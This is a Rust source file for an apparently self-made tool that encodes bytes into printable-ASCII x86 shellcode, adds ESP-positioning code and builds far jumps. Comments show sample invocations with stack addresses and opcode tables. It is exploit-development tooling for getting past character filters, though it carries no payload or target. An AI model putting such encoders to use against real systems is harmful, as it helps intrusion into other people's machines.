mod instructions;
mod translate;
use translate::get_dwords;
use instructions::{InstructionSet, CONTACT_ME};


fn wrap(words: &Vec<u32>, brute: bool) -> InstructionSet {
    let mut output = InstructionSet::new();
    output.one_eax();
    let mut eax = 1;
    for dword in words {
        output.encode(*dword, &mut eax, brute);
    }
    output
}

fn position(esp: u32, eip: u32, offset: usize, brute: bool) -> InstructionSet {
    let mut output = InstructionSet::new();
    output.position(esp, eip, offset, brute);
    output
}


//cargo run -- --wrap "e9 10 fe ff ff"
/// generates ascii wrapped x86 shellcode for a byte array
pub fn do_wrap(bytes: &Vec<u8>, brute: bool) -> InstructionSet {
    println!("Encoding {} bytes: {:02X?}", bytes.len(), bytes);
    wrap(&get_dwords(bytes), brute)
}

//cargo run -- --esp 19CF54 --eip 19D758
///Generates positioning code
pub fn do_position(esp: u32, eip: u32, brute: bool) -> InstructionSet {
    println!("Generating positioning code for 0x{:08X} -> 0x{:08X}", esp, eip);
    position(esp, eip, 0, brute)
}


//cargo run -- --wrap "e9 10 fe ff ff" --esp 19CF54 --eip 19D758
pub fn do_position_wrap(bytes: &Vec<u8>, esp: u32, eip: u32, brute: bool) -> InstructionSet {
    println!("Encoding {} bytes: {:02X?}", bytes.len(), bytes);
    let words = get_dwords(bytes);
    let wrapped_payload = wrap(&words, brute);

    let unpack_len = words.len()*4;
    let mut output = position(esp, eip, wrapped_payload.len()+unpack_len, brute);
    output.extend(wrapped_payload);
    println!("Generated positioning code for 0x{:08X} -> 0x{:08X}", esp, eip+(output.len()+unpack_len) as u32);
    output
}

//cargo run -- --esp 19CF54 --eip 19D758 --jump 19D588
pub fn do_position_jump(esp: u32, eip: u32, jmp: u32, mut brute: bool) -> InstructionSet {
    let mut last_last_len = 0;
    let mut last_len = 0;
    println!("Generating positioning jump code for 0x{:08X} -> 0x{:08X}", eip, jmp);
    loop {
        let jump_code = InstructionSet::create_far_jump(jmp, eip+last_len as u32);
        let words = get_dwords(&jump_code);
        let wrapped_jump = wrap(&words, brute);

        let mut output = position(esp, eip, last_len+words.len(), brute);
        output.extend(wrapped_jump);
        let payload_len = output.len()+jump_code.len();
        if payload_len == last_len {return output}
        else if payload_len == last_last_len {
            if brute  {
                println!("Couldnt optimize for size. Trying normal technique.");
                brute = false;
                last_len = 0;
                last_last_len = 0;
            } else {
                println!("Attempting raw modification");
                //find location of encoded jump
                //compare its output to the target location
                //iter through its values
                //find somewhere to add value
                return output
            }
        } else {
            last_last_len = last_len;
            last_len = payload_len
        }
    }
    unimplemented!()
}

// "\x54",                 //push    esp
// "\x58",                 //pop     eax
// "\x66\x05\x2B\x08",     //add     ax,0x82C
// "\x50",                 //push    eax
// "\x5c",                 //pop     esp


//some adds
//05 7f 7f 7f 7f          add    eax,0x7f7f7f7f
//66 05 7f 7f             add    ax,0x7f7f
//04 7f                   add    al,0x7f 
//some subs
//2d 7f 7f 7f 7f          sub    eax,0x7f7f7f7f
//66 2d 7f 7f             sub    ax,0x7f7f
//2c 7f                   sub    al,0x7f 



//jump target 19D588

//position && jump:
//  gen jump code
//  gen position code
//  set last len
//  while last len != cur len
//  re-gen jump code based on last len
//  regen position code based on last len